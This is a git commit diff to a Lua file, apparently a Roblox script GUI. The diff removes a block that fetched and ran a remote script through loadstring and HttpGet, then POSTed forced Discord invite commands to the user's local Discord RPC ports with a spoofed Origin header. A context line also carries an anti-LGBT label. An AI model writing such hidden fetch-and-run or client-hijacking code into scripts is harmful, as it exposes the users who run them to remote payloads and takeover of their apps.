3b6e85cad1f3e26f2a7a6a62fb8243e1e6984c85
Afyadh <73753274+Afyadh@users.noreply.github.com>
2022-02-20 09:41:34 -0800

    Update DragonOrbz.lua

--- DragonOrbz.lua
+++ DragonOrbz.lua
@@ -10,22 +10,6 @@ b:Label("ION LIKE LGBT",{
     TextColor = Color3.fromRGB(255,255,255); -- Self Explaining
     BgColor = Color3.fromRGB(69,69,69); -- Self Explaining
 })
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Afyadh/Kronos-Hub/main/startload.lua"))()
-    if syn.request or http_request or request or http.request then
-    local req = syn.request or http_request or request or http.request or nil
-        if req ~= nil then
-            for port=6463, 6472, 1 do
-                local inv = "http://127.0.0.1:"..tostring(port).."/rpc?v=1"
-                local http = game:GetService("HttpService")
-                local t = {cmd = "INVITE_BROWSER", args = {["code"] = "EPsZZ5fQd5"}, nonce = string.lower(http:GenerateGUID(false))}
-                local post = http:JSONEncode(t)
-                req({Url = inv, Method = "POST", Body = post, Headers = {["Content-Type"] = "application/json", ["Origin"] = "https://discord.com"}})
-            end
-        end
-    end
-    end)
-wait(2)
 local Settings = {}
 
 local function resetXD()
